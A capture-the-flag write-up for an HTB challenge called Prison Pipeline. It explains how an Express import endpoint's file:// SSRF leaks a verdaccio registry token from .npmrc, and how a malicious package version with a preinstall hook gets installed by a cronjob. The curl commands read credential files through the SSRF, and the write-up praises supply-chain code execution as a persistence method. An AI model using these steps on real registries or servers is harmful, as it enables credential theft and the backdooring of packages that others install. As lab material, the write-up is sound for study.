# Prison Pipeline

**Event:** HTB MCP TryOut · **Category:** misc · **Points:** 1000 · **Difficulty:** very easy

## TL;DR

Express app with a server-side fetch helper that accepts `file://` URLs. Read the verdaccio registry token off disk via SSRF, publish a malicious package version with a preinstall script, wait thirty seconds for the cronjob to install it, and read the flag through the same file SSRF that started everything.

## What I saw first

`POST /api/prisoners/import` takes a URL and fetches it via `node-libcurl`. nginx routes by Host header, so `Host: registry.prison-pipeline.htb` reaches the verdaccio registry on a different port. A cronjob every thirty seconds runs `npm --registry http://localhost:4873 outdated prisoner-db && npm update prisoner-db && pm2 restart prison-pipeline`. The flag is at `/root/flag`, readable through a suid `/readflag`.

## What I tried that did not work

First malicious package was a stub `module.exports = {}` with the preinstall script. The cronjob installed it, ran the preinstall (which wrote `/readflag` output to `/tmp/loot` successfully), then `pm2 restart prison-pipeline` failed because my stub did not export the real `prisoner-db` class the app expected. The app crashed with a 502, which broke the file-SSRF endpoint, which broke my ability to read `/tmp/loot`.

## What worked

Two-stage supply-chain. First version exfiltrates. Second version contains the same exfil plus the real `prisoner-db` code so the app comes back up.

```bash
# Stage 1: leak the verdaccio token via SSRF.
curl -sX POST "$HOST/api/prisoners/import" -H 'Content-Type: application/json' \
  -d '{"url":"file:///home/node/.npmrc"}'
# -> _authToken="..."

# Stage 2: publish v1.0.99 with preinstall hook.
# package.json -> { "scripts": { "preinstall": "/readflag > /tmp/loot 2>&1" } }
# tar + PUT directly to verdaccio via Host-header bypass through nginx.

# Stage 3: cronjob installs v1.0.99 -> /tmp/loot now has the flag.
#          But app crashed because stub is not real prisoner-db.
#          Publish v1.0.100 with real prisoner-db code AND same preinstall.

# Stage 4: app comes back up. Read /tmp/loot via SSRF.
curl -sX POST "$HOST/api/prisoners/import" -H 'Content-Type: application/json' \
  -d '{"url":"file:///tmp/loot"}'
```

## Flag

The flag was the `/readflag` output that `preinstall` wrote to `/tmp/loot`, retrieved through the same file-SSRF I used in stage one.

## What this taught me

Two things landed.

Supply-chain RCE on a target with periodic auto-update is one of the cleanest persistence patterns. You do not need a reverse shell. You need a registry, a manifest, and patience.

The exfil channel and the application are the same surface. If you crash the app, you lose the exfil channel. Always publish a working v2 that keeps the app alive, even if v1 already ran the code that got you the secret. Otherwise you have the flag and no way to read it.
